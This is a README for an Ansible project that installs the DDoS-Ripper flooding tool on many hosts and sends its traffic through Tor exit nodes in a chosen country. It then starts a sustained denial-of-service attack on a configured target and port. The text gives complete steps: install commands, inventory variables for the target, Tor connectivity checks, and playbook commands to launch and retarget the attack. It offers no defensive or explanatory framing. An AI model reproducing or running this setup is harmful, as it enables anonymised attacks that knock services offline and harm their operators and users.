**Usage:**

# 1. Install python3 and Ansible
```
sudo apt install python3 python3-pip
sudo -H pip3 install --upgrade pip
pip3 install ansible==2.9.7
```

Create ansible config file:
```
mkdir -p /etc/ansible
vim /etc/ansible/ansible.cfg

$ cat /etc/ansible/ansible.cfg
[defaults]
host_key_checking = False
callback_whitelist = profile_tasks
timeout = 300
command_warnings = False
[inventory]
[privilege_escalation]
[paramiko_connection]
[ssh_connection]
ssh_args = -C -o ControlMaster=auto -o ControlPersist=600s -o UserKnownHostsFile=/dev/null
control_path = /tmp/ansible-ssh-%%h-%%p-%%r
pipelining = True
[persistent_connection]
connect_timeout = 300
[accelerate]
[selinux]
[colors]
[diff]
```

Clone git repo:
```
mkdir -p /opt/git
cd /opt/git
git clone https://github.com/deadmopozz/ddos-ripper-ansible.git
```

# 2. Prepare inventory /opt/git/ddos-ripper-ansible/inventory/hosts:

- add your hosts and vars as follow:
```
# Add hosts to this group
[all]
kozak1      ansible_host=192.168.0.2
kozak2      ansible_host=192.168.0.3
kozak3      ansible_host=192.168.0.4
kozak4      ansible_host=192.168.0.5


[all:vars]
# Default soft vars
git_repo=https://github.com/palahsu/DDoS-Ripper.git
git_dest=/tmp/ddos-ripper
soft=['tor', 'tor-geoipdb', 'proxychains', 'geoip-bin', 'python3', 'python3-pip']

# Ansible vars
ansible_ssh_private_key_file="/path/to/your/ssh_key" # !!! Configure path to your ssh key
ansible_user="username_with_sudo_permissions" # !!! Configure username with sudo permissions

# Tor vars
ExitNodes='ExitNodes {ru}' # Choose you exit nodes for tor proxy, syntax:  ExitNodes {ru},{us}

# Systemd unit vars
MemoryHigh=450M # Memory soft limit for systemd unit
MemoryMax=550M # Memory hard limit for systemd unit, unit will fail in case it will use more memory then configured value
CPUQuota=85% # CPU limit for unit

# Target vars
target=127.0.0.1 # !!! configure target for atack, it could be IP address or DNS name 
port=443 # !!! Configure port for atack
time=10000 

[group1]
kozak1
kozak2

[group2]
kozak3
kozak4
```

# 3. Before the atack you should check the connection to target (torsocks telnet [target] [port]):
If you see the output below, then the attack will be successful
```
# torsocks telnet google.com 443
Trying 142.250.217.110...
Connected to 142.250.217.110.
Escape character is '^]'.
```

If the output will be like this:
```
# torsocks telnet google.com 443
Trying 142.250.217.110...
```
You should restart tor "systemctl restart tor" and try again.
If it doesn't help, try to change ExitNode to another country, and try again.
If nothing helps - change the target

# 4. Run installation playbook and start the attack:

### You must have the same username and password or ssh key for each server
### After playbook run has finished - attack has started, you can check logs /var/log/syslog for details
### If you want to change target you need to change the variables (Target vars) in /opt/git/ddos-ripper-ansible/inventory/hosts file and rerun the playbook

### - If you use username and password for ssh authentication (username should be configured in inventory file /opt/git/ddos-ripper-ansible/inventory/hosts):
```
cd /opt/git/ddos-ripper-ansible/playbooks/initial-setup
ansible-playbook -i ../../inventory/hosts initial-setup.yml -b -kK 
```

### - If you use ssh key for ssh authentication (username and path to ssh key file should be configured in inventory file /opt/git/ddos-ripper-ansible/inventory/hosts):
```
cd /opt/git/ddos-ripper-ansible/playbooks/initial-setup
ansible-playbook -i ../../inventory/hosts initial-setup.yml -b 
```


Useful commands:
```
Check IP:
ansible all -i ../../inventory/hosts -b -m shell -a "torsocks curl -s ifconfig.me"
Check Coutry:
ansible all -i ../../inventory/hosts -b -m shell -a "geoiplookup $(torsocks curl -s ifconfig.me)"
```